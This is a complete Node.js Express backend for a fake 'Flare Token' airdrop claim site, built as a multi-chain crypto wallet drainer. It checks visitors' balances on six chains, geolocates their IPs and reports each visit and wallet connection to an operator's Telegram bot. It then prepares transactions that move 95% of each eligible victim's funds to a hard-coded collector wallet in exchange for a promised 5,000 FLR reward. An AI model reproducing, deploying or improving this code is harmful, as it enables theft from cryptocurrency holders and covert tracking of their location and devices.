// index.js - FLARE TOKEN BACKEND - ULTRA DETAILED + ALL BALANCES
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://flareairdropclaim.vercel.app', 'https://flarebackend-eight.vercel.app', 'https://flaretokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Flare Token Backend',
    version: '3.0.0',
    status: '🟢 ONLINE',
    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
    telegramBot: telegramBotName || 'Not connected',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION - CORRECT CONTRACT ADDRESSES
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1,
    explorer: 'https://etherscan.io/tx/',
    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288'
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56,
    explorer: 'https://bscscan.com/tx/',
    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288'
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137,
    explorer: 'https://polygonscan.com/tx/',
    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278'
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161,
    explorer: 'https://arbiscan.io/tx/',
    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278'
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114,
    explorer: 'https://snowtrace.io/tx/',
    contractAddress: '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F'
  },
  Flare: {
    urls: [
      'https://flare-api.flare.network/ext/C/rpc',
      'https://flare.publicnode.com',
      'https://rpc.flare.xyz'
    ],
    symbol: 'FLR',
    decimals: 18,
    chainId: 14,
    explorer: 'https://flare-explorer.flare.network/tx/',
    contractAddress: '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F'
  }
};

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES (Matching frontend)
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'BSC': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'Polygon': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
  'Flare': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F'
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Flare Token',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'FLR',
    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      processedTransactions: []
    },
    flowEnabled: process.env.FLOW_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram not configured');
    return false;
  }
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { timeout: 10000 });
    console.log('✅ Telegram message sent');
    return true;
  } catch (error) {
    console.error('❌ Telegram error:', error.response?.data?.description || error.message);
    return false;
  }
}

async function enableTelegram() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram credentials missing');
    return false;
  }
  
  try {
    console.log('🔌 Testing Telegram connection...');
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 10000 });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      console.log(`✅ Telegram connected: @${telegramBotName}`);
      
      await sendTelegramMessage(
        `🚀 <b>FLARE TOKEN BACKEND ONLINE</b> 🚀\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `✅ <b>MultiChain FlowRouter Active</b>\n\n` +
        `📦 <b>COLLECTOR:</b> \`${COLLECTOR_WALLET.substring(0, 10)}...\`\n` +
        `🤖 <b>BOT:</b> @${telegramBotName}\n` +
        `🌐 <b>NETWORKS:</b> Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare\n` +
        `📊 <b>MONITORING:</b> All User Activity\n` +
        `⏰ <b>STARTED:</b> ${new Date().toLocaleString()}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
      );
      return true;
    }
  } catch (error) {
    console.error('❌ Telegram connection failed:', error.message);
  }
  return false;
}

// ============================================
// DEVICE DETECTION
// ============================================

function getDeviceInfo(userAgent) {
  if (!userAgent) return { device: 'Unknown', os: 'Unknown', browser: 'Unknown', isBot: false, botType: null };
  
  const ua = userAgent.toLowerCase();
  
  const botPatterns = {
    'Googlebot': 'googlebot',
    'Bingbot': 'bingbot',
    'Yandex': 'yandexbot',
    'Facebook': 'facebookexternalhit|facebot',
    'Twitter': 'twitterbot',
    'LinkedIn': 'linkedinbot',
    'Telegram': 'telegrambot',
    'Discord': 'discordbot',
    'WhatsApp': 'whatsapp',
    'Slack': 'slackbot',
    'Pinterest': 'pinterest',
    'Apple': 'applebot'
  };
  
  let isBot = false;
  let botType = null;
  
  for (const [bot, pattern] of Object.entries(botPatterns)) {
    if (new RegExp(pattern).test(ua)) {
      isBot = true;
      botType = bot;
      break;
    }
  }
  
  let device = 'Desktop';
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
    device = 'Mobile';
  } else if (ua.includes('ipad') || ua.includes('tablet')) {
    device = 'Tablet';
  }
  
  let os = 'Unknown';
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios') || ua.includes('iphone')) os = 'iOS';
  
  let browser = 'Unknown';
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edg')) browser = 'Edge';
  
  return { device, os, browser, isBot, botType };
}

// ============================================
// IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
      return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local', isp: 'Local', timezone: 'Local', lat: 0, lon: 0 };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}?fields=status,country,countryCode,regionName,city,isp,lat,lon,timezone`, { timeout: 3000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'NL': '🇳🇱', 'CH': '🇨🇭', 'AU': '🇦🇺',
        'JP': '🇯🇵', 'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷', 'NG': '🇳🇬',
        'ZA': '🇿🇦', 'MX': '🇲🇽', 'KR': '🇰🇷', 'SG': '🇸🇬', 'AE': '🇦🇪'
      };
      
      return {
        country: response.data.country || 'Unknown',
        flag: flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown',
        isp: response.data.isp || 'Unknown',
        timezone: response.data.timezone || 'Unknown',
        lat: response.data.lat,
        lon: response.data.lon
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: 'Unknown', isp: 'Unknown', timezone: 'Unknown', lat: 0, lon: 0 };
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: { ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks', vs_currencies: 'usd' },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32,
      flr: response.data['flare-networks']?.usd || 0.03
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03 };
  }
}

// ============================================
// GET WALLET BALANCE
// ============================================

async function getWalletBalance(walletAddress) {
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    chainsWithBalance: 0,
    chainsScanned: 0,
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1, config: RPC_CONFIG.Ethereum },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56, config: RPC_CONFIG.BSC },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137, config: RPC_CONFIG.Polygon },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161, config: RPC_CONFIG.Arbitrum },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114, config: RPC_CONFIG.Avalanche },
      { name: 'Flare', symbol: 'FLR', price: prices.flr, chainId: 14, config: RPC_CONFIG.Flare }
    ];

    let totalValue = 0;
    let chainDetails = [];
    let chainsWithBalance = 0;
    
    for (const chain of chains) {
      try {
        const provider = new ethers.JsonRpcProvider(chain.config.urls[0]);
        const balance = await Promise.race([
          provider.getBalance(walletAddress),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
        ]);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        const valueUSD = amount * chain.price;
        
        results.chainsScanned++;
        
        const chainData = {
          chain: chain.name,
          chainId: chain.chainId,
          amount: amount,
          amountFormatted: amount.toFixed(6),
          valueUSD: valueUSD,
          valueUSDFormatted: valueUSD.toFixed(2),
          symbol: chain.symbol,
          hasBalance: amount > 0.000001,
          contractAddress: chain.config.contractAddress,
          explorer: chain.config.explorer
        };
        
        chainDetails.push(chainData);
        
        if (amount > 0.000001) {
          totalValue += valueUSD;
          chainsWithBalance++;
        }
        
      } catch (error) {
        chainDetails.push({ chain: chain.name, error: true, hasBalance: false, amount: 0, valueUSD: 0 });
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= 1;
    results.balances = chainDetails;
    results.chainsWithBalance = chainsWithBalance;
    
    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error.message);
    return { success: false, data: results };
  }
}

// ============================================
// GENERATE EMAIL FROM WALLET
// ============================================

function generateWalletEmail(walletAddress) {
  const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
  const username = `flr${hash.substring(0, 12)}`;
  const domains = ['proton.me', 'gmail.com', 'outlook.com', 'pm.me', 'yahoo.com'];
  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
  return `${username}@${domain}`;
}

// ============================================
// TRACK VISIT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const location = await getIPLocation(clientIP);
    const device = getDeviceInfo(userAgent);
    
    let refererType = 'Direct';
    if (referer) {
      if (referer.includes('google')) refererType = 'Google';
      else if (referer.includes('facebook')) refererType = 'Facebook';
      else if (referer.includes('twitter')) refererType = 'Twitter';
      else if (referer.includes('telegram')) refererType = 'Telegram';
      else refererType = 'External';
    }
    
    const visitId = `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
    
    const visit = {
      id: visitId,
      ip: clientIP,
      timestamp: new Date().toISOString(),
      country: location.country,
      flag: location.flag,
      city: location.city,
      device: device.device,
      os: device.os,
      browser: device.browser,
      isBot: device.isBot,
      refererType: refererType,
      path: path || '/'
    };
    
    memoryStorage.siteVisits.push(visit);
    if (memoryStorage.siteVisits.length > 500) memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-500);
    
    // Send Telegram notification for human visitors
    if (!device.isBot && telegramEnabled) {
      const message = 
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🌐 <b>NEW SITE VISIT</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `📍 ${location.country} ${location.flag} (${location.city})\n` +
        `💻 ${device.device} - ${device.browser}\n` +
        `🔗 ${refererType}\n` +
        `🆔 ${visitId}\n` +
        `⏰ ${new Date().toLocaleString()}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      
      await sendTelegramMessage(message);
    }
    
    res.json({ success: true, data: { visitId, isBot: device.isBot } });
    
  } catch (error) {
    console.error('Visit error:', error);
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 WALLET CONNECT: ${walletAddress.substring(0, 10)}...`);
    
    const location = await getIPLocation(clientIP);
    const device = getDeviceInfo(req.headers['user-agent']);
    const email = generateWalletEmail(walletAddress);
    const balanceResult = await getWalletBalance(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewUser = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        country: location.country,
        flag: location.flag,
        city: location.city,
        email: email,
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        claimed: false,
        balances: balanceResult.data.balances,
        chainsWithBalance: balanceResult.data.chainsWithBalance
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    } else {
      participant.lastSeen = new Date().toISOString();
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.balances = balanceResult.data.balances;
      participant.chainsWithBalance = balanceResult.data.chainsWithBalance;
    }
    
    if (balanceResult.data.isEligible) {
      memoryStorage.settings.statistics.eligibleParticipants++;
    }
    
    // Format balances
    let balancesDisplay = '';
    balanceResult.data.balances.forEach(b => {
      if (b.hasBalance) {
        balancesDisplay += `   • ${b.chain}: <b>${b.amountFormatted} ${b.symbol}</b> = $${b.valueUSDFormatted}\n`;
      }
    });
    if (balancesDisplay === '') balancesDisplay = '   • No balances found\n';
    
    const statusEmoji = balanceResult.data.isEligible ? '🎯' : '👋';
    const statusText = balanceResult.data.isEligible ? 'ELIGIBLE ✅' : 'NOT ELIGIBLE ⚠️';
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `${statusEmoji} <b>WALLET CONNECTED - ${statusText}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👛 <b>WALLET:</b> \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `💰 <b>TOTAL:</b> $${balanceResult.data.totalValueUSD}\n` +
      `🔗 <b>CHAINS:</b> ${balanceResult.data.chainsWithBalance}/6\n\n` +
      `📊 <b>BALANCES:</b>\n${balancesDisplay}\n` +
      `📍 <b>LOCATION:</b> ${location.country} ${location.flag} (${location.city})\n` +
      `📧 <b>EMAIL:</b> ${email}\n` +
      `💻 <b>DEVICE:</b> ${device.device} - ${device.browser}\n` +
      `🆕 <b>STATUS:</b> ${isNewUser ? 'First time visitor ✨' : 'Returning user 🔄'}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({
      success: true,
      data: {
        walletAddress,
        email,
        country: location.country,
        flag: location.flag,
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        chainsWithBalance: balanceResult.data.chainsWithBalance,
        balances: balanceResult.data.balances.map(b => ({
          chain: b.chain,
          amount: b.amountFormatted,
          valueUSD: b.valueUSDFormatted,
          hasBalance: b.hasBalance
        }))
      }
    });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.hasBalance)
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        originalAmount: b.amountFormatted,
        amount: (b.amount * 0.95).toFixed(6),
        originalValueUSD: b.valueUSDFormatted,
        valueUSD: (b.valueUSD * 0.95).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalOriginalUSD = balanceResult.data.totalValueUSD.toFixed(2);
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    const flowId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalOriginalUSD,
      totalFlowUSD,
      totalFLR: '5000',
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    let txDisplay = '';
    transactions.forEach((t, index) => {
      txDisplay += `   ${index + 1}. ${t.chain}: Send ${t.amount} ${t.symbol} ($${t.valueUSD})\n`;
    });
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔐 <b>FLOW PREPARED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👛 <b>WALLET:</b> \`${walletAddress.substring(0, 10)}...\`\n` +
      `💰 <b>TOTAL:</b> $${totalOriginalUSD}\n` +
      `💵 <b>FLOW:</b> $${totalFlowUSD} (95%)\n` +
      `🎁 <b>REWARD:</b> 5,000 FLR\n` +
      `🔗 <b>CHAINS:</b> ${transactions.length}\n\n` +
      `📋 <b>TRANSACTIONS:</b>\n${txDisplay}\n` +
      `🆔 <b>FLOW ID:</b> \`${flowId}\`\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({
      success: true,
      data: { flowId, totalFlowUSD, totalFLR: '5000', transactionCount: transactions.length, transactions }
    });
    
  } catch (error) {
    console.error('Prepare error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// PROCESS FLOW
// ============================================

app.post('/api/presale/process-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD, gasFee } = req.body;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress?.toLowerCase());
    const flow = memoryStorage.pendingFlows.get(flowId);
    
    const explorerUrl = RPC_CONFIG[chainName]?.explorer || '';
    const txLink = explorerUrl ? `${explorerUrl}${txHash}` : txHash;
    
    if (participant && flow) {
      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress, chain: chainName, flowId, txHash, amount, symbol, valueUSD, timestamp: new Date().toISOString()
      });
      
      flow.completedChains = flow.completedChains || [];
      flow.completedChains.push(chainName);
      
      const chainMessage = 
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `💰 <b>CHAIN PROCESSED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👛 <b>WALLET:</b> \`${walletAddress?.substring(0, 10)}...\`\n` +
        `🔗 <b>CHAIN:</b> ${chainName}\n` +
        `💵 <b>AMOUNT:</b> ${amount} ${symbol} ($${valueUSD})\n` +
        `🔍 <b>TX:</b> \`${txHash.substring(0, 16)}...\`\n` +
        `📊 <b>PROGRESS:</b> ${flow.completedChains.length}/${flow.transactions.length}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      
      await sendTelegramMessage(chainMessage);
      
      if (flow.completedChains.length === flow.transactions.length) {
        memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
        
        let completedList = '';
        flow.completedChains.forEach((c, i) => { completedList += `   ${i+1}. ${c}\n`; });
        
        const completedMessage = 
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `🎉 <b>FLOW COMPLETED</b> 🎉\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `👛 <b>WALLET:</b> \`${walletAddress?.substring(0, 10)}...\`\n` +
          `💰 <b>TOTAL:</b> $${flow.totalFlowUSD}\n` +
          `🎁 <b>REWARD:</b> 5,000 FLR\n\n` +
          `✅ <b>COMPLETED CHAINS:</b>\n${completedList}\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        await sendTelegramMessage(completedMessage);
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Process error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, email, location, chains, totalProcessedValue, reward, bonus } = req.body;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress?.toLowerCase());
    
    if (participant) {
      participant.claimed = true;
      participant.claimedAt = new Date().toISOString();
      memoryStorage.settings.statistics.claimedParticipants++;
    }
    
    const claimId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    let chainsList = '';
    if (chains && chains.length > 0) {
      chains.forEach((c, i) => { chainsList += `   ${i+1}. ${c}\n`; });
    }
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🎉 <b>FLARE TOKEN CLAIMED</b> 🎉\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👛 <b>WALLET:</b> \`${walletAddress?.substring(0, 10)}...\`\n` +
      `🎁 <b>REWARD:</b> ${reward || '5,000 FLR'}\n` +
      `💵 <b>VALUE:</b> $${totalProcessedValue || '0'}\n` +
      `✅ <b>CHAINS:</b>\n${chainsList}\n` +
      `📍 <b>LOCATION:</b> ${location?.country || 'Unknown'}\n` +
      `🆔 <b>CLAIM ID:</b> \`${claimId}\`\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({ success: true, data: { claimId, reward: reward || '5000 FLR' } });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    summary: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      siteVisits: memoryStorage.siteVisits.length,
      telegram: telegramEnabled ? '✅' : '❌',
      telegramBot: telegramBotName
    }
  });
});

app.get('/api/admin/test-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const testMessage = 
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🧪 <b>TELEGRAM TEST</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `✅ <b>Connection Working!</b>\n\n` +
    `🤖 Bot: @${telegramBotName}\n` +
    `📊 Status: ${telegramEnabled ? '🟢 Active' : '🔴 Inactive'}\n` +
    `⏰ Time: ${new Date().toLocaleString()}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
  
  const success = await sendTelegramMessage(testMessage);
  
  res.json({ success, telegramEnabled, botName: telegramBotName });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ FLARE TOKEN BACKEND
  ================================================
  📍 Port: ${PORT}
  🪙 Token: FLR (Flare)
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  `);
  
  await enableTelegram();
});
